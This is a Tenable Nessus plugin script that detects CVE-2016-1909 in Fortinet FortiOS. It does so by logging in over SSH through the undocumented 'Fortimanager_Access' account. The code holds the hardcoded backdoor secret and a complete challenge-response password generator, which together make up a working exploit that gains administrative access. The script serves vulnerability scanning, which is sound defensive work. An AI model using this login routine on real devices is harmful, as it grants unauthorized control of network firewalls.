#TRUSTED 5cfecca559051ad68400075708a61f1b8d4d402831f2430d45065d434bfd6fa9ffda1ec9344cd440e982dc6896d0be824ecd8378772ef8fa66e567d20ef85a487b24cb04813e09c1835581219f034cb3dd0088373d84eb34718d3fd14dc1e69a936ea6f39c2f60d3f4fe4d06d88fd24d646c31449add75468ca83a290de2545baf19283f8ceb6b46e6f6e01f3fd10df6d6894337b7c4395d1196e32f0f393c4506a9457402ffb21db49e9b5b3aefa0bbfc00307f6f761f049266eb40b9fa11bc296030d313189cd3a9e20c4cefe0be4c361d6d389d99b7b7b375b846886a5d349e69f3d43ee00614b5be4c49d3239bde782732b45de4f11f3fb80249d95d6436ce4e2de7b554a6322267ef586e9a953dabc23eeacdddaa90b806828ee7f3637fd3e6598281fb28490677b7f0865109dcef758adb3439b143c5156ec9b640ce238fc640632c72ad4ad2d75d1fc22705222973566b1222e13a05c06c0fe6d5ae0b849a7fdc5fca024176ab9ada0e188ca3efd626c78b199a0dfb06b73780bbbde420bf05f0f63ce5398441a067115c356279b6caf181d42babe5246e73fd7f58da289c613cc441149a0a30994be6ede873068b9dffffd54821e6f4cf2e65dc8275233f820dfa288f06c21df02b297076f94dd5fa551bbc189640c483c8e11150662f3f6cb884385b11f6f979954bd5e9463ac8948e17e08fce2e2ebc8c3eaba86e
#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(87896);
  script_version("1.19");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/07/11");

  script_cve_id("CVE-2016-1909");
  script_bugtraq_id(80581);

  script_name(english:"Fortinet FortiOS SSH Undocumented Interactive Login Vulnerability");
  script_summary(english:"Attempts to login to SSH as the user 'Fortimanager_Access'.");

  script_set_attribute(attribute:"synopsis", value:
"The SSH server running on the remote host can be logged into using
default SSH credentials.");
  script_set_attribute(attribute:"description", value:
"The SSH server running on the remote host can be logged into using
default SSH credentials. The 'Fortimanager_Access' account has a
password based on the string 'FGTAbc11*xy+Qqz27' and a calculated hash
that is publicly known. A remote attacker can exploit this to gain
administrative access to the remote host.");
  # https://blog.fortinet.com/post/brief-statement-regarding-issues-found-with-fortios
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?0c2dcc56");
  script_set_attribute(attribute:"see_also", value:"https://seclists.org/fulldisclosure/2016/Jan/26");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Fortinet FortiOS 4.3.17 / 5.0.8 / 5.2.x / 5.4.x or later.
Alternatively, as a workaround, disable administrative access via SSH
on all interfaces.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2016-1909");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2016/01/12");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/07/09");
  script_set_attribute(attribute:"plugin_publication_date", value:"2016/01/13");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/o:fortinet:fortios");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_set_attribute(attribute:"default_account", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2016-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("ssh_detect.nasl");
  script_require_ports("Services/ssh");

  script_exclude_keys("global_settings/supplied_logins_only");

  exit(0);
}

include("ssh_compat.inc");
include("data_protection.inc");

checking_default_account_dont_report = TRUE;

# This script implements its own SSH login logic. The reason for  this is that
# this exploit requires special logic at the interactive password prompt.
# Instead of having a normal prompt like "Password:", affected versions will
# prompt with a string of digits. These digits are rolled into a custom
# "hashing" algorithm in order to generate a semi-random password.

function ssh_custom_interactive_auth(user, port)
{
  local_var code, crap, next, payload, prompt, prompts, res, inst, i, password;

  # Request keyboard-interactive authentication from the server.
  payload =
    putstring(buffer:user) +
    putstring(buffer:"ssh-connection") +
    putstring(buffer:"keyboard-interactive") +
    putstring(buffer:"en-US") +
    putstring(buffer:"");

  send_ssh_packet(code:SSH_MSG_USERAUTH_REQUEST, payload:payload);

  # Read the server's response.
  res = recv_ssh_packet();
  code = ord(res[0]);
  next = 1;

  if (code == SSH_MSG_USERAUTH_FAILURE) return FALSE;
  if (code == SSH_MSG_UNIMPLEMENTED) return FALSE;
  if (code != SSH_MSG_USERAUTH_INFO_REQUEST) return FALSE;

  # Skip over name.
  crap = getstring(buffer:res, pos:next);
  next += 4 + strlen(crap);

  # Skip over instruction.
  inst = getstring(buffer:res, pos:next);
  next += 4 + strlen(inst);

  # Skip over language.
  crap = getstring(buffer:res, pos:next);
  next += 4 + strlen(crap);

  # Parse number of prompts.
  prompts = ntol(buffer:res, begin:next);
  next += 4;

  if (prompts <= 0) return FALSE;

  # the prompt is the challenge code
  prompt = getstring(buffer:res, pos:next);

  # verify the "prompt" is all numerals
  for (i = 0; i < strlen(prompt); i++) {
    if (prompt[i] < '0' || prompt[i] >'9') {
      if (i != 0) return FALSE;
      else if (prompt[i] != '-') return FALSE;
    }
  }

  # generate the SHA1 encoded portion
  local_var sha1_password = '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00';
  sha1_password += prompt;
  sha1_password += 'FGTAbc11*xy+Qqz27';
  sha1_password += '\xA3\x88\xBA\x2E\x42\x4C\xB0\x4A\x53\x79\x30\xC1\x31\x07\xCC\x3F\xA1\x32\x90\x29\xA9\x81\x5B\x70';
  sha1_password = SHA1(sha1_password);

  # generate the base64 encoded version
  local_var base64_password = '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00';
  base64_password += sha1_password;
  base64_password = base64(str:base64_password);

  # the final form of the password
  password = 'AK1' + base64_password;

  # Send a single response, containing the password, to server.
  SSH_PACKET_LOG_SCRUB_STRING = password;
  payload = raw_int32(i:1) + putstring(buffer:password);
  send_ssh_packet(code:SSH_MSG_USERAUTH_INFO_RESPONSE, payload:payload);
  SSH_PACKET_LOG_SCRUB_STRING = FALSE;

  # Read response from server.
  res = recv_ssh_packet();
  code = ord(res[0]);
  return code == SSH_MSG_USERAUTH_SUCCESS;
}

if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);

# Hard coded username enabled keyboard-interactive
user = 'Fortimanager_Access';
password = '';
port = get_service(svc:"ssh", exit_on_fail:TRUE);

_ssh_socket = open_sock_tcp(port);
if (!_ssh_socket) audit(AUDIT_SOCK_FAIL, port);

# initialization
init();
server_version = ssh_exchange_identification();

#Fortios devices lockout after multiple attempts so sleep and try again
if (!server_version && "Login refused, too many authentication failures." >< sshlib::_compat_session.error)
{
  sleep(60);
  _ssh_socket = open_sock_tcp(port);
  if (!_ssh_socket) audit(AUDIT_SOCK_FAIL, port);

  init();

  server_version = ssh_exchange_identification();
}

if (!server_version)
{
  ssh_close_connection();
  audit(AUDIT_RESP_BAD, port, "SSH ID exchange.");
}

_ssh_server_version = server_version;

# key exchange
ret = ssh_kex2(server_version:server_version, nofingerprint:TRUE);
if (ret != 0)
{
  ssh_close_connection();
  audit(AUDIT_LISTEN_NOT_VULN, "SSH", port);
}

if (!ssh_req_svc("ssh-userauth"))
{
  ssh_close_connection();
  audit(AUDIT_LISTEN_NOT_VULN, "SSH", port);
}

if (!ssh_auth_supported(method:"keyboard-interactive", user:user))
{
  ssh_close_connection();
  audit(AUDIT_LISTEN_NOT_VULN, "SSH", port);
}

system_status = '';
if (ssh_custom_interactive_auth(user:user, port:port)) {
  resp = ssh_cmd(cmd:"get system status", nosh:TRUE, nosudo:TRUE);
  if (resp && "Version:" >< resp) {
    system_status = resp;
  }
}

ssh_close_connection();

if (system_status != '')
{
  if (report_verbosity > 0)
  {
     report =
       '\n' + 'It was possible to SSH into the remote FortiOS device using the' +
       '\n' + 'following username :' +
       '\n' +
       '\n' + '  User     : ' + data_protection::sanitize_user_enum(users:user) +
       '\n' +
       '\n' + 'and to run the \'get system status\' command, which returned :'+
       '\n' +
       '\n' + system_status + '\n';
    security_hole(port:port, extra:report);
  } else security_hole(port:port);
}
else
{
  audit(AUDIT_LISTEN_NOT_VULN, "SSH", port);
}
